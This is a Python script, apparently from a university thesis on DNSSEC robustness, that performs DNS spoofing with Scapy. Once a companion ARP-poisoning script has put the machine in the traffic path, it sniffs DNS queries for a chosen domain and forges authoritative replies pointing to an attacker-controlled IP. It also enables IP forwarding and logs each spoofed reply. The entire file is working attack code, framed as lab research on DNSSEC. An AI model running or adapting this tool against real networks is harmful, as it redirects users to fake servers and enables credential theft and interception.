#!/usr/bin/env python3
# ============================================================
#  dns_spoof.py — Interceptación y Falsificación de Consultas DNS
#  Técnica: DNS Spoofing sobre canal MITM establecido por arp_poison.py
#  Tesis: Evaluación de la robustez de DNSSEC y DNS tradicional
#         frente a técnicas de envenenamiento de caché
#  UTN — Brian Steve Rea Arias
#
#  Descripción:
#    Intercepta consultas DNS de los clientes que pasan por el
#    atacante (tras ARP poisoning) y responde con la IP falsa
#    antes de que llegue la respuesta legítima.
#    Opera en capa 2/3 — DNSSEC detecta la manipulación pero
#    no puede bloquear el reenvío a nivel de red (limitación E5).
#
#  Uso:
#    # Primero lanzar arp_poison.py en otra terminal, luego:
#    python3 dns_spoof.py
#    python3 dns_spoof.py --iface eth0 --dominio empresa.local
# ============================================================

from scapy.all import *
import argparse, csv, signal, sys
from datetime import datetime

# ---- Configuración por defecto ----
IFACE           = "eth0"
IP_ATACANTE     = "192.168.10.66"
IP_FALSA        = "192.168.10.66"   # IP del servidor web falso
DOMINIO_TARGET  = "empresa.local"   # Dominio a interceptar
LOG_FILE        = "/tmp/dns_spoof_resultados.csv"
activo          = True
contadores      = {"interceptadas": 0, "respondidas": 0, "ignoradas": 0}

# ---- Inicializar log CSV ----
def init_log():
    with open(LOG_FILE, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow([
            "timestamp", "ip_cliente", "dominio_consultado",
            "ip_inyectada", "con_dnssec", "accion"
        ])

def escribir_log(ip_cliente, dominio, ip_inyectada, con_dnssec, accion):
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    with open(LOG_FILE, 'a', newline='') as f:
        writer = csv.writer(f)
        writer.writerow([ts, ip_cliente, dominio, ip_inyectada, con_dnssec, accion])

# ---- Callback de procesamiento de paquetes ----
def procesar_paquete(pkt):
    global contadores

    # Solo paquetes DNS de consulta (qr=0) con UDP puerto 53
    if not (pkt.haslayer(DNS) and pkt.haslayer(UDP)):
        return
    if pkt[DNS].qr != 0:   # 0 = query, 1 = response
        return
    if not pkt.haslayer(DNSQR):
        return

    dominio = pkt[DNSQR].qname.decode().rstrip(".")
    ip_cliente = pkt[IP].src
    contadores["interceptadas"] += 1

    # Solo interceptar consultas al dominio objetivo
    if DOMINIO_TARGET not in dominio:
        contadores["ignoradas"] += 1
        return

    # Detectar si el cliente pidió DNSSEC (flag DO o tipo DNSKEY/RRSIG)
    con_dnssec = bool(pkt[DNS].ad or pkt[DNS].cd or
                      (pkt.haslayer(DNSQR) and pkt[DNSQR].qtype in [46, 48, 50]))

    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    print(f"  [{ts}] DNS query: {ip_cliente} → {dominio} "
          f"{'[+DNSSEC]' if con_dnssec else ''}")

    # Construir respuesta DNS falsa
    respuesta = (
        IP(src=pkt[IP].dst, dst=ip_cliente) /
        UDP(sport=53, dport=pkt[UDP].sport) /
        DNS(
            id=pkt[DNS].id,
            qr=1,           # Es una respuesta
            aa=1,           # Autoritativo (falso)
            rd=pkt[DNS].rd,
            ra=1,
            qd=pkt[DNS].qd,
            an=DNSRR(
                rrname=pkt[DNSQR].qname,
                type="A",
                ttl=300,
                rdata=IP_FALSA
            )
        )
    )

    send(respuesta, verbose=0, iface=IFACE)
    contadores["respondidas"] += 1

    accion = "SPOOFED_CON_DNSSEC" if con_dnssec else "SPOOFED"
    escribir_log(ip_cliente, dominio, IP_FALSA, con_dnssec, accion)

    print(f"  [{ts}] → Respuesta falsa enviada: {dominio} = {IP_FALSA} "
          f"{'(cliente validará con DNSSEC)' if con_dnssec else ''}")

# ---- Estadísticas periódicas ----
def imprimir_stats():
    print(f"\n  Paquetes interceptados : {contadores['interceptadas']}")
    print(f"  Consultas respondidas  : {contadores['respondidas']}")
    print(f"  Consultas ignoradas    : {contadores['ignoradas']}")
    print(f"  Log: {LOG_FILE}\n")

# ---- Señal de interrupción ----
def handler_salida(sig, frame):
    global activo
    print("\n\n  Deteniendo DNS spoofing...")
    activo = False
    imprimir_stats()
    print("  Nota: Si DNSSEC está activo, las respuestas falsas")
    print("  fueron detectadas por el cliente (flag AD ausente/SERVFAIL).")
    sys.exit(0)

# ---- Main ----
def main():
    global IFACE, DOMINIO_TARGET, IP_FALSA

    parser = argparse.ArgumentParser(description="DNS Spoofing MITM — Tesis UTN E5")
    parser.add_argument("--iface",    default=IFACE)
    parser.add_argument("--dominio",  default=DOMINIO_TARGET,
                        help="Dominio a interceptar")
    parser.add_argument("--ip-falsa", default=IP_FALSA,
                        help="IP del servidor web falso")
    args = parser.parse_args()

    IFACE          = args.iface
    DOMINIO_TARGET = args.dominio
    IP_FALSA       = args.ip_falsa

    print("=" * 60)
    print("  DNS SPOOFING — Interceptación de consultas DNS")
    print(f"  Interfaz   : {IFACE}")
    print(f"  Dominio    : {DOMINIO_TARGET}")
    print(f"  IP falsa   : {IP_FALSA}")
    print(f"  Log        : {LOG_FILE}")
    print()
    print("  PREREQUISITO: arp_poison.py debe estar corriendo")
    print("  para que el tráfico pase por este nodo.")
    print()
    print("  Nota sobre DNSSEC (E5):")
    print("  Con DNSSEC activo, el cliente rechazará estas respuestas")
    print("  porque no tienen firmas RRSIG válidas. El tráfico ARP")
    print("  sí queda interceptado (limitación capa 2 de DNSSEC).")
    print("  Ctrl+C para detener")
    print("=" * 60)
    print()

    signal.signal(signal.SIGINT, handler_salida)
    init_log()

    # Habilitar IP forwarding para no cortar el tráfico legítimo
    import subprocess
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"],
                   capture_output=True)

    print(f"  Escuchando consultas DNS en {IFACE}...")
    print(f"  Filtro: udp port 53 and host not {IP_ATACANTE}\n")

    sniff(
        iface=IFACE,
        filter=f"udp port 53 and host not {IP_ATACANTE}",
        prn=procesar_paquete,
        store=0
    )

if __name__ == "__main__":
    main()
